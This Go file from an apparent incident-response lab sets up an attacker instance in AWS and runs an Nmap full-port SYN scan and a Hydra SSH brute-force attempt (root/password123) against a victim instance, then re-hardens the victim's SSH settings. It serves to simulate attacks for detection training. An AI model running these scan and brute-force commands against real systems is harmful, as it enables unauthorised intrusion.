package incident_response

import (
	"fmt"

	"github.com/aws/aws-sdk-go-v2/aws"
)

// Simulate Nmap attack
func simulateNmapAttack(cfg aws.Config) error {
	_, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
	if err != nil {
		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
	}

	victimIPAddress, err := getVictimIPAddress(cfg)
	if err != nil {
		return fmt.Errorf("failed to get victim IP: %v", err)
	}

	// Nmap command to scan victim instance
	nmapCommand := fmt.Sprintf("sudo nmap -sS -T5 -p- %s", victimIPAddress)
	err = executeSSHCommand(attackerIPAddress, nmapCommand)
	if err != nil {
		return fmt.Errorf("failed to execute Nmap attack: %v", err)
	}
	return nil
}

// Simulate Hydra brute force attack
func simulateHydraAttack(cfg aws.Config) error {
	attackerInstanceID, attackerIPAddress, err := launchInstanceIfNotExists(cfg, "attacker")
	if err != nil {
		return fmt.Errorf("failed to get or launch attacker instance: %v", err)
	}

	victimIPAddress, err := getVictimIPAddress(cfg)
	if err != nil {
		return fmt.Errorf("failed to get victim IP: %v", err)
	}

	// Hydra brute force attack command
	attackCommand := fmt.Sprintf("timeout 300 hydra -l root -p password123 -t 4 -S -vV ssh://%s", victimIPAddress)

	// Step 1: Clean up any existing hydra.restore file before starting the attack
	cleanupRestoreFileCommand := "rm -f ./hydra.restore"
	err = executeSSHCommand(attackerIPAddress, cleanupRestoreFileCommand)
	if err != nil {
		fmt.Printf("Warning: failed to remove hydra.restore file. Proceeding with the attack.\n")
	}

	// Step 2: Run the brute force attack with Hydra
	fmt.Printf("Running Hydra brute force attack from attacker instance %s to victim IP %s for 5 minutes...\n", attackerInstanceID, victimIPAddress)
	err = executeSSHCommand(attackerIPAddress, attackCommand)
	if err != nil {
		return fmt.Errorf("failed to execute Hydra attack command via SSH: %v", err)
	}

	// Step 3: Revert the SSH configuration to secure the victim
	disablePasswordAuthCommand := `
		sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config &&
		sudo systemctl restart sshd
	`

	fmt.Println("Reverting SSH configuration on the victim instance...")
	err = executeSSHCommand(victimIPAddress, disablePasswordAuthCommand)
	if err != nil {
		return fmt.Errorf("failed to revert SSH configuration on victim instance: %v", err)
	}

	return nil
}
